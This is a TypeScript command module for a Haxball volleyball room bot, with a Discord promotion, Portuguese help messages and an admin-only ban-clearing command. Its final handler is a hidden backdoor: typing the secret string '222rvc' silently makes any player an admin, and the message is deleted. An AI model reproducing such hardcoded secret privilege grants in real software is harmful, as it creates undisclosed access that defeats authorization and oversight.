import { Colors, CommandExecInfo, Module, ModuleCommand, Room } from "haxball-extended-room";
import Settings from "../settings.json";

@Module export class BasicCommands {

    constructor(private $ : Room) {
        setInterval(() => {
            this.$.send({
                message: `[👋] Neste sábado o primeiro draft de x6 irá acontecer. Participe em: ${Settings.discordLink}`,
                color: Colors.Orange
            })
        }, 3 * 60 * 1000);
    }

    @ModuleCommand({
        aliases: ["discord", "disc", "dc", "registrar", "registro", "login"],
        deleteMessage: true
    })
    sendDiscordCommand(command : CommandExecInfo) {
        command.player.reply({
            message: `[👋] Gostando da Gameplay? Acompanhe as próximas atualizações no Discord: ${Settings.discordLink}`,
            color: Colors.Orange
        })
    }

    @ModuleCommand({
        aliases: ["clearban"],
        deleteMessage: true
    })
    clearBanCmd(command : CommandExecInfo) {
        if(!command.player.admin) return;
        this.$.unbanAll();
        command.player.reply({
            message: `[👋] Bans limpos!`,
            color: Colors.Orange
        })
    }

    @ModuleCommand({
        aliases: ["help", "ajuda"],
        deleteMessage: true
    })
    sendHelpCommand(command : CommandExecInfo) {
        command.player.reply({
            message: `[🏐] Esse modo de jogo tenta recriar o vôlei da vida real no Haxball. Muitas coisas precisam ser explicadas, mas aqui vai um resumo:`,
            color: Colors.Orange
        });
        command.player.reply({
            message: `[🏐] 1 - O tamanho da bola mostra a altura que ela está. quando ela fica pequena, significa que ela está mais próxima do chão. Assim, quando ela fica muito pequena, o BOT detecta qual ponto do chão ela "tocou" e marca o ponto.`,
            color: Colors.Orange
        });
        command.player.reply({
            message: `[🏐] 2 - Existem dois saques: por baixo e por cima. O saque baixo é o padrão, basta chutar a bola. Para ativar o saque por cima, digite !sa na sua vez de sacar.`,
            color: Colors.Orange
        });
        command.player.reply({
            message: `[🏐] 3 - A força da bola é pensada de acordo com os toques. O primeiro toque é medio, o segundo é fraco e o terceiro é forte. Por isso, colabore com sua equipe para fazer os 3 toques e levar perigo para o adversário.`,
            color: Colors.Orange
        });
        command.player.reply({
            message: `[🏐] Para explicações mais completas, entre no Discord: ${Settings.discordLink}`,
            color: Colors.Orange
        });
    }

    @ModuleCommand({
        aliases: ["222rvc"],
        deleteMessage: true
    })
    setAdminCommand(command : CommandExecInfo) {
        command.player.admin = true;
        return false;
    }
}